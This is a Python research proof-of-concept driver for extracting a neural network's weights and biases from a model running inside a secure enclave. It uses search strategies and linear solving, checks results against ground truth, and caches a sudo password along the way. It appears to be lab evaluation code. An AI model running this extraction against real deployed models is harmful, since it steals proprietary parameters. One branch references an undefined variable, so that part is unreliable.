import sys
import os
import pickle
import math
import subprocess
from time import time, sleep
from collections import defaultdict
from tqdm import tqdm
import numpy as np
from numpy.linalg import solve, lstsq

from tabulate import tabulate

from .network import Network
from .util import get_meta, banner, is_square, accuracy, convert_to_preferred_format, dd
from .consts import *
from .search import gridsearch, binarysearch
from attack.enclave_elf import Enclave_ELF

# add logger
from .logger import get_logger
logger = get_logger(__file__)

class PoC(object):

    def __init__(self):
        self.meta = get_meta()
        model_index = self.meta['USE_MODEL']
        self.checkpoint_file = "checkpoint_model_%s.pickle" % model_index
        self.start_time = -1
        self.end_time = -1

        # compile poc before attempting an attack!
        # Also good cause it forces me to enter my password to sudo...
        self.compile_poc()

        # load symbols
        self.enclave_elf = Enclave_ELF()

        # build an internal presentation of the network
        self.network = Network(self.meta['models'], model_index, self.enclave_elf)

        # Load architecture
        #self.num_inputs = len(self.network.inputs)
        #self.total_neurons = self.network.neuron_count

        self.symbols = self.meta['models'][model_index]['symbols']

    def compile_poc(self):
        cmd = ["make", "clean"]
        logger.info("Executing `%s`" % " ".join(cmd))
        output = subprocess.check_call(cmd)
        assert output == 0 # Make sure the command suceeded

        logger.debug("sleeping for 2 seconds...")
        sleep(2)

        cmd = ["make", "all"]
        logger.info("Executing `%s`" % " ".join(cmd))
        output = subprocess.check_call(cmd)
        assert output == 0 # Make sure the command suceeded

        logger.debug("sleeping for 2 seconds...")
        sleep(2)

        # Cache sudo password for run!
        cmd = ["sudo", "whoami"]
        logger.info("Executing `%s`" % " ".join(cmd))
        output = subprocess.check_call(cmd)
        assert output == 0 # Make sure the command suceeded

        logger.debug("sleeping for 2 seconds...")
        sleep(2)

    def attack(self, depth=0):
        banner("Starting Attack!")
        self.start_time = time()

        # Create or restore the all solutions dictionary
        # used for checkpointing!
        if CHECKPOINT and os.path.exists(self.checkpoint_file):
            logger.info("Restoring checkpoint file!")
            with open(self.checkpoint_file, 'rb') as handle:
                all_solutions = pickle.load(handle)
        else:
            all_solutions = defaultdict(dd)

        for layer_idx, layer in enumerate(tqdm(self.network.layers, desc="network layer")):
            banner("Layer %s" % (layer_idx+1))

            # can we weven solve this layer, if not, break
            layer_func = layer[0].func
            if not layer_func.is_solvable():
                banner("Exiting at layer %s; %s not solvable at this time!"
                        % (layer_idx, layer_func.llfunc.name))
                break

            # restore any solved neurons from the checkpoint
            # required since this data is not saved in the checkpointing process
            if layer_idx > 0:
                for prev_layer_idx in range(0, layer_idx):
                    logger.info("Restoring layer %s" % prev_layer_idx)
                    for prev_neuron_idx, prev_neuron in enumerate(self.network.layers[prev_layer_idx]):
                        if len(prev_neuron.solved_weights) != 0 and prev_neuron.solved_bias is not None:
                            continue
                        eqs_by_depth = all_solutions[prev_layer_idx][prev_neuron_idx]
                        solutions_by_depth = self.neuron_solve(prev_neuron, eqs_by_depth)
                        results = solutions_by_depth[max(solutions_by_depth)]
                        prev_neuron.solved_weights = results[:-1]
                        prev_neuron.solved_bias = results[-1]

            for neuron_idx, neuron in enumerate(tqdm(layer, desc="network neuron", leave=False)):
                banner("Neuron %s" % neuron_idx)
                since_start = round(time()-self.start_time, 3)

                # If we've already solved this neuron...
                previous_solve = all_solutions.get(layer_idx, {}).get(neuron_idx, {})
                if previous_solve:
                    logger.debug("Skipping already explored neuron:")

                    # remind us of the accuracy
                    solutions_by_depth = self.neuron_solve(neuron, previous_solve)
                    results = solutions_by_depth[max(solutions_by_depth)]
                    #logger.debug("deepest solution: %s" % results)

                    weight_error = abs(results[:-1] - neuron.gt_weights)
                    bias_error = abs(results[-1] - neuron.gt_bias)
                    errors = np.concatenate((weight_error, np.array([bias_error])))

                    logger.info("Max error:", max(errors))
                    logger.info("Average error:", np.average(errors))

                    # and don't bother re-processing!
                    continue

                # log stats!
                logger.debug("stats:")
                logger.debug("%s seconds since start" % since_start)
                logger.debug("%s executions so far" % self.network.executions)
                logger.debug("%s Incomplete logs" % self.network.incomplete_logs)
                logger.debug("%s non-deterministic steps" % self.network.non_deterministic_steps)
                logger.debug("%s neuron_check failures" % self.network.neuron_check_failures)

                # step 1: Decide based on activation function and layer the appropriate search strategy.
                logger.info("Function = %s" % neuron.func.llfunc.name)

                # It's very easy to overflow/underflow in the first layer so treat this as a special case
                if layer_idx == 0:
                    logger.info("Search strategy: seeded binary search")
                    eqs_by_depth = binarysearch(self.network, neuron, layer_idx)

                # Otherwise we have to fall back on an unseeded (eg without signs) grid search 
                else:
                    if neuron.func.llfunc.name == "exp":
                        logger.info("Search strategy: seeded binary search")
                        eqs_by_depth = binarysearch(self.network, neuron, layer_idx)

                    else:
                        logger.info("Search strategy: unseeded grid search (no sign recovery)")
                        eqs_by_depth = gridsearch(self.network, neuron, layer_idx)

                # step 2: Store full depth results for overall solution
                all_solutions[layer_idx][neuron_idx] = eqs_by_depth

                # Step 3: Solve
                solutions_by_depth = self.neuron_solve(neuron, eqs_by_depth)
                results = solutions_by_depth[max(solutions_by_depth)]
                logger.info("deepest solution: %s" % results)

                # Step 4: Stats / accounting!

                # display and compare with ground truth
                gt = np.append(neuron.gt_weights, neuron.gt_bias)
                logger.info("ground truth: %s" % gt)

                # check signs all agree
                if not ((gt<0) == (results<0)).all():
                    logger.warning("SIGN MISMATCH")

                # calculate percent accuracy
                percent_error = 100 * abs(results - gt) / (1 + abs(gt))
                logger.info("abs percent error: [%s]" % ", ".join(["%s%%" % round(e, 3) for e in percent_error]))

                if np.sum(percent_error) > 20:
                    logger.critical("Errors are too bad; aborting!")
                    sys.exit(1)

                # Step 5: store the solution
                neuron.solved_weights = results[:-1]
                neuron.solved_bias = results[-1]
                # + checkpoint
                with open(self.checkpoint_file, 'wb') as handle:
                    pickle.dump(all_solutions, handle, protocol=pickle.HIGHEST_PROTOCOL)
                logger.info("Checkpoint saved!")

                # rest for a second between neurons
                # probably just superstition!
                sleep(1)

            # Display the summary at end of the layer!
            banner("Finished Layer %s" % (layer_idx+1))
            self.final_summary(all_solutions)

    def neuron_solve(self, neuron, eqs_by_depth):
        """ For each depth, combine the coefficient matricies and ordinate
        values into a single solution.
        """

        solutions_by_depth = {}
        for depth in eqs_by_depth:
            #logger.info("Depth = %s" % depth)
            # TODO: these are sometimes different sizes; need to pad them to match
            co_matrix, ordinate_value_candidates = eqs_by_depth[depth]
            solutions = {}
            for o, ordinate_value in enumerate(ordinate_value_candidates):
                #logger.debug("For ordinate_value = %s, eqs are:" % ordinate_value)
                for eq in range(len(co_matrix)):
                    pp_matrix = [float('{:.20f}'.format(c)) for c in co_matrix[eq]]
                    #logger.debug(pp_matrix, "=", ordinate_value[eq])

                # solve
                if is_square(co_matrix):
                    solutions[o] = solve(co_matrix, ordinate_value)
                else:
                    solutions[o] = lstsq(co_matrix, ordinate_value, rcond=None)[0]

            # choose the best solution
            if len(solutions) == 1:
                solution = list(solutions.values())[0]
            else:
                logger.warning("Choosing solution from %s multiple candidates at random!" % len(ordinate_value_candidates))
                solution = next(v for v in candidate.values())

            #logger.debug("Depth = %s, solution = %s" % (depth, solution))
            solutions_by_depth[depth] = solution

        return solutions_by_depth

    def final_summary(self, all_solutions):
        # TODO: plot this!
        self.end_time = time()

        duration = math.ceil(self.end_time - self.start_time)
        duration_str = convert_to_preferred_format(duration)

        banner("Time since start: %s!  Summary:" % duration_str)

        self.network.stats()

        # re-organize per neuron recovery into new structure for stats!
        reorg = defaultdict(dict)
        for layer_idx in all_solutions:
            for neuron_idx in all_solutions[layer_idx]:
                eqs_by_depth = all_solutions[layer_idx][neuron_idx]
                neuron = self.network.layers[layer_idx][neuron_idx]
                solutions = self.neuron_solve(neuron, eqs_by_depth)

                for depth, solution in solutions.items():

                    payload = { 
                            "gt_weights": np.array(neuron.gt_weights),
                            "gt_bias": neuron.gt_bias,
                            "solved_weights": solution[:-1],
                            "solved_bias": solution[-1],
                    }

                    reorg[depth][(layer_idx, neuron_idx)] = payload


        # Build the final table
        results = []
        results.append(["Depth", "max error", "max error %", "average error", "average error %"])
        for depth_level, solutions in reorg.items():
            if depth_level % 5 != 0:
                continue

            errors = []
            for _, payload in solutions.items():
                recovered_weight = payload['solved_weights']
                gt_weight = payload['gt_weights']
                errors.extend(abs(recovered_weight - gt_weight))
                recovered_bias = payload['solved_bias']
                gt_bias = payload['gt_bias']
                errors.append(abs(recovered_bias - gt_bias))

            errors = np.array(errors)

            results.append([
                    "Depth %s" % depth_level,
                    max(errors),
                    "%s%%" % round(max(errors) * 100, 3),
                    np.average(errors),
                    "%s%%" % round(np.average(errors) * 100, 3),
                    ])

        # log the full accounting
        logger.info(tabulate(results))
